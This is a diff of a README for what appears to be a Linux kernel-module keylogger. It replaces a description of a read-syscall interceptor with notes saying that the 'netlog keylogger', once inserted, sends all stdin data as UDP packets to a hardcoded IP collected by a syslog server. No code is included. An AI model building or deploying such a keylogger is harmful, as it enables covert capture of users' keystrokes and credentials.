@@ -1,33 +1,14 @@
+This should be a decent implementation of the netlog keylogger
+(it works, but it's not polished yet)
 
-+-----------------+---------------------------------------------------------------------+
-| Files included  | Description                                                         |
-+-----------------+---------------------------------------------------------------------+
-+-----------------+---------------------------------------------------------------------+
-| sysmap.sh       | a bash script that creates a header file named `sysmap.h` that maps |
-|                 | the kernel symbol names to their addresses in memory. Only symbols  |
-|                 | of type d/D (initialized writable data), r/R (read-only data) and   |
-|                 | t/T (code) are being considered.                                    |
-+-----------------+---------------------------------------------------------------------+
-| interceptor.c   | a kernel module that hooks the read system call and outputs the     |
-|                 | intercepted data when reading from stdin. Additionaly, when a magic |
-|                 | command gets intercepted it performs a panic-less system reboot.    |
-+-----------------+---------------------------------------------------------------------+
-| Makefile        | a Makefile that compiles the module `interceptor.c`                 |
-+-----------------+---------------------------------------------------------------------+
-| README          | current file                                                        |
-+-----------------+---------------------------------------------------------------------+
+When inserted it should send all stdin data as udp packets over the
+network to the IP that is hardcoded in the netlogger_init function.
+Replace your IP there.
 
+You also need to have some syslog server running, I used syslog-ng.
+For more information see [1].
 
+For some API hints see [2].
 
-+---------------------------------------------------+-----------------------------------+
-| How to...                                         | Bash command                      |
-+---------------------------------------------------+-----------------------------------+
-+---------------------------------------------------+-----------------------------------+
-| run sysmap.sh script (assuming the script is in   | # add execution permission        |
-| our current directory)                            | $ chmod +x sysmap.sh              |
-|                                                   | $ ./sysmap.sh                     |
-+---------------------------------------------------+-----------------------------------+
-| compile Linux kernel module `interceptor.c`       | $ make                            |
-+---------------------------------------------------+-----------------------------------+
-| clean directory                                   | $ make clean                      |
-+---------------------------------------------------+-----------------------------------+
+[1] - https://wiki.ubuntu.com/Kernel/Netconsole#Syslog-ng_.28Linux.29
+[2] - http://people.redhat.com/~jmoyer/netpoll-linux_kongress-2005.pdf 
